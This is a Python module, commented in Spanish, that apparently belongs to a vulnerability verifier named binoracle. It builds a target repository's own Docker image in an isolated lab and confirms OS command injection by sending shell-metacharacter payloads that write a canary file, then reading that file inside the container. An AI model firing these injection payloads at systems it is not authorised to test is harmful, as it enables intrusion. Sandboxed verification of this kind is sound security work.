"""Verificacion dinamica CMS-AGNOSTICA: cuando el objetivo no es WordPress/Drupal/Joomla (un
repo cualquiera que trae su PROPIO Dockerfile o docker-compose.yml), binoracle no se rinde --
construye y arranca ESE Dockerfile/compose tal cual, en una red/entorno aislado propio, y
verifica contra el contenedor real resultante, con la misma disciplina de prueba dura (nunca
`verified=True` por un codigo de estado, siempre por una confirmacion independiente) que
wpverify.py/drupalverify.py/joomlaverify.py.

Esto es deliberadamente mas limitado que los verificadores CMS-especificos: no hay login/sesion
de por medio (no hay un flujo de autenticacion generico que valga para cualquier stack), asi que
solo cubre clases de vulnerabilidad que no lo necesitan -- de momento, command injection via un
canario de fichero (igual de valido en Python/Node/Go/PHP/Java: todos escriben a disco igual) --
y se amplia poco a poco."""
from __future__ import annotations

import os
import re
import subprocess
import time
from typing import Callable, List, Optional

from .wpverify import WpVerifyResult, _docker_daemon_ok, _lab_host, _pick_param, _run, _token

_COMPOSE_NAMES = ("docker-compose.yml", "docker-compose.yaml", "compose.yml", "compose.yaml")

_CI_HINTS = ("cmd", "command", "exec", "run", "host", "ip", "address", "target", "ping",
             "domain", "url", "path", "file", "name", "query", "search", "input")


def _find_build_target(source_dir: str) -> Optional[dict]:
    """Busca, en el codigo YA descargado, como arrancar el objetivo -- un docker-compose.yml/
    compose.yml (en la raiz o un nivel por debajo, el sitio donde casi todo el mundo lo pone), o
    si no hay, un Dockerfile suelto. Devuelve None si no hay ninguna de las dos formas: sin eso,
    no hay nada que montar sin adivinar el stack a ciegas."""
    for root, dirs, files in os.walk(source_dir):
        depth = root[len(source_dir):].count(os.sep)
        if depth > 2:
            dirs[:] = []
            continue
        for name in _COMPOSE_NAMES:
            if name in files:
                return {"kind": "compose", "path": os.path.join(root, name), "context": root}
    for root, dirs, files in os.walk(source_dir):
        depth = root[len(source_dir):].count(os.sep)
        if depth > 2:
            dirs[:] = []
            continue
        if "Dockerfile" in files:
            return {"kind": "dockerfile", "path": os.path.join(root, "Dockerfile"), "context": root}
    return None


def _exposed_ports_from_dockerfile(path: str) -> List[int]:
    ports: List[int] = []
    try:
        with open(path, "r", errors="ignore") as f:
            for line in f:
                m = re.match(r"\s*EXPOSE\s+([0-9 ]+)", line, re.IGNORECASE)
                if m:
                    ports.extend(int(p) for p in m.group(1).split() if p.isdigit())
    except OSError:
        pass
    return ports


# puertos comunes para cuando el Dockerfile no declara EXPOSE (pasa mas de lo que parece) -- los
# que de verdad usan por defecto Flask/Django/Express/Rails/Spring/ASP.NET/PHP-FPM+nginx/etc.
_COMMON_PORTS = [80, 8080, 3000, 5000, 8000, 4000, 8888, 9000, 4200, 1337]


class _GenericLab:
    """Analogo generico de _Lab (wpverify.py), pero el contenido del contenedor es el que trae
    el propio repo -- no hay imagen base fija ni sabemos de antemano el stack."""

    def __init__(self, tag: str):
        self.tag = tag
        self.net = f"binoracle-genverify-{tag}"
        self.container = f"binoracle-genverify-{tag}-app"
        self.image = f"binoracle-genverify-{tag}:latest"
        self.compose_project = f"binoracle-genverify-{tag}"
        self.kind = ""
        self._created: List[str] = []

    def sh(self, *args, timeout=60.0, input_text=None):
        return _run(["docker"] + list(args), timeout=timeout, input_text=input_text)

    def build_and_run(self, target: dict, timeout_build=600.0, timeout_run=60.0):
        self.kind = target["kind"]
        if self.kind == "dockerfile":
            r = self.sh("build", "-t", self.image, "-f", target["path"], target["context"],
                       timeout=timeout_build)
            if r.returncode != 0:
                return r
            self.sh("network", "create", self.net, timeout=30)
            self._created.append(("network", self.net))
            self._created.append(("image", self.image))
            r = self.sh("run", "-d", "--name", self.container, "--network", self.net, "-P",
                       self.image, timeout=timeout_run)
            if r.returncode == 0:
                self._created.append(("container", self.container))
            return r
        else:
            env = dict(os.environ, COMPOSE_PROJECT_NAME=self.compose_project)
            r = subprocess.run(["docker", "compose", "-f", target["path"], "-p",
                                self.compose_project, "up", "-d", "--build"],
                               cwd=target["context"], env=env, capture_output=True, text=True,
                               timeout=timeout_build)
            self._created.append(("compose", target["path"]))
            return r

    def running_containers(self, timeout=15.0) -> List[str]:
        if self.kind == "dockerfile":
            return [self.container]
        r = self.sh("ps", "-a", "--filter", f"label=com.docker.compose.project={self.compose_project}",
                   "--format", "{{.Names}}", timeout=timeout)
        return [n for n in (r.stdout or "").splitlines() if n.strip()]

    def published_ports(self, container: str, timeout=15.0) -> List[str]:
        """Puertos del HOST publicados para `container` (sea `docker run -P` o los `ports:` del
        compose) -- `docker port` los lista sin tener que adivinar ni parsear YAML."""
        r = self.sh("port", container, timeout=timeout)
        ports = []
        for line in (r.stdout or "").splitlines():
            m = re.search(r":(\d+)\s*$", line.strip())
            if m:
                ports.append(m.group(1))
        return ports

    def discover_http(self, tries: int = 60, delay: float = 3.0) -> Optional[tuple]:
        """Prueba TODOS los puertos publicados de TODOS los contenedores levantados hasta que uno
        responda HTTP (status < 500) -- sin asumir cual de los contenedores del compose es el
        servidor web ni en que puerto escucha. Devuelve (container, port) o None."""
        import urllib.request
        host = _lab_host()
        for _ in range(tries):
            for c in self.running_containers():
                for port in self.published_ports(c):
                    try:
                        with urllib.request.urlopen(f"http://{host}:{port}/", timeout=4) as r:
                            if r.status < 500:
                                return (c, port)
                    except Exception:
                        continue
            time.sleep(delay)
        return None

    def logs_tail(self, name: str, lines: int = 40) -> str:
        try:
            r = self.sh("logs", "--tail", str(lines), name, timeout=15)
            return ((r.stdout or "") + (r.stderr or "")).strip()
        except Exception as e:
            return f"(no se pudieron leer logs de {name}: {e})"

    def read_file(self, container: str, path: str, timeout=10.0) -> str:
        r = self.sh("exec", container, "sh", "-c", f"cat {path} 2>/dev/null", timeout=timeout)
        return r.stdout or ""

    def teardown(self):
        for kind, name in reversed(self._created):
            try:
                if kind == "container":
                    self.sh("rm", "-f", name, timeout=30)
                elif kind == "image":
                    self.sh("rmi", "-f", name, timeout=30)
                elif kind == "network":
                    self.sh("network", "rm", name, timeout=15)
                elif kind == "compose":
                    subprocess.run(["docker", "compose", "-f", name, "-p", self.compose_project,
                                    "down", "-v"], capture_output=True, timeout=60)
            except Exception:
                pass


def verify_generic_command_injection(
    source_dir: str, endpoint: str, http_method: str, parameters,
    cmd_param_hint: str = "", on_step: Optional[Callable[[str], None]] = None,
    budget_s: float = 900.0,
) -> WpVerifyResult:
    """Verifica OS command injection contra CUALQUIER objetivo que traiga su propio Dockerfile/
    docker-compose.yml, sin asumir el stack (Python/Node/Go/PHP/Java/Ruby... todos escriben a
    disco igual, asi que el canario de fichero via `docker exec` sirve siempre). No hay login de
    por medio -- esta clase, a diferencia de missing-authorization o account-takeover, no lo
    necesita para probarse."""
    step = on_step or (lambda _m: None)
    res = WpVerifyResult()
    if not _docker_daemon_ok():
        res.available = False
        res.detail = "sin daemon Docker alcanzable"
        res.limitations.append("verificacion dinamica NO intentada: sin daemon Docker")
        return res

    target = _find_build_target(source_dir)
    if target is None:
        res.detail = "no se encontro Dockerfile ni docker-compose.yml en el codigo descargado"
        res.limitations.append("la verificacion generica SOLO puede montar un objetivo que "
                               "traiga su propio Dockerfile/docker-compose.yml -- sin eso no "
                               "hay forma de arrancarlo sin adivinar el stack")
        return res
    step(f"objetivo generico detectado: {target['kind']} en {target['path']}")

    lab = _GenericLab(_token())
    try:
        step(f"construyendo y arrancando el objetivo (docker build/compose, puede tardar)...")
        r = lab.build_and_run(target)
        if r.returncode != 0:
            res.detail = f"fallo al construir/arrancar el objetivo: {(r.stderr or r.stdout or '')[:500]}"
            return res

        step("esperando a que el objetivo responda HTTP en alguno de sus puertos publicados...")
        found_http = lab.discover_http()
        if found_http is None:
            res.detail = "el objetivo arranco pero ningun puerto publicado respondio HTTP a tiempo"
            for c in lab.running_containers():
                res.logs.append(f"docker logs ({c}):\n" + lab.logs_tail(c))
            return res
        container, port = found_http
        base_url = f"http://{_lab_host()}:{port}"
        step(f"objetivo arriba: {base_url} (contenedor '{container}')")

        import requests
        secret = _token() * 4
        canary_path = f"/tmp/binoracle_ci_{_token()}.txt"
        m = (http_method or "POST").upper()
        res.evidence.update({"base_url": base_url, "contenedor": container, "endpoint": endpoint,
                             "metodo": m, "canary_path": canary_path, "canary_secret": secret})

        payload_forms = [
            f"; echo {secret} > {canary_path}",
            f"| echo {secret} > {canary_path}",
            f"`echo {secret} > {canary_path}`",
            f"$(echo {secret} > {canary_path})",
            f"&& echo {secret} > {canary_path}",
        ]
        candidate_params = [cmd_param_hint] if cmd_param_hint else (
            list(parameters.keys()) if isinstance(parameters, dict) else list(parameters or []))
        if not candidate_params:
            candidate_params = [_pick_param(parameters, _CI_HINTS) or "input"]

        tried = []
        found = False
        for pname in candidate_params:
            if found:
                break
            for form in payload_forms:
                payload = dict(parameters) if isinstance(parameters, dict) else {}
                payload[pname] = form
                try:
                    requests.request(m, base_url + endpoint, timeout=15,
                                     data=payload if m != "GET" else None,
                                     params=payload if m == "GET" else None)
                except Exception as e:
                    tried.append({"parametro": pname, "error": str(e)})
                    continue
                time.sleep(1)
                content = lab.read_file(container, canary_path)
                present = secret in content
                tried.append({"parametro": pname, "payload": form, "secreto_presente": present})
                if present:
                    found = True
                    res.evidence["parametro_ganador"] = pname
                    res.evidence["payload_ganador"] = form
                    step(f"VERIFICADO: {canary_path} dentro del contenedor contiene el secreto "
                         f"exacto tras inyectar via '{pname}' -- el comando se ejecuto de verdad.")
                    break

        res.evidence["intentos"] = tried
        if found:
            res.verified = True
            res.ok = True
            res.detail = (f"COMMAND INJECTION confirmada: el payload en el parametro "
                          f"'{res.evidence['parametro_ganador']}' hizo que {canary_path} "
                          f"apareciera DENTRO del contenedor con el secreto exacto -- prueba "
                          f"inequivoca de ejecucion de comandos, no una deduccion por status code")
        else:
            res.ok = True
            res.detail = (f"se probaron {len(tried)} combinaciones de parametro/forma de "
                          f"inyeccion contra {endpoint} pero ninguna hizo aparecer el canario -- "
                          f"no se confirmo command injection (puede que el endpoint/parametro no "
                          f"sean los reales, o que la entrada no llegue a una shell sin filtrar)")
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = f"timeout de infraestructura: {e}"
        return res
    except Exception as e:
        res.detail = f"error inesperado: {e}"
        return res
    finally:
        step("desmontando el laboratorio generico (contenedores/red/imagen)...")
        lab.teardown()
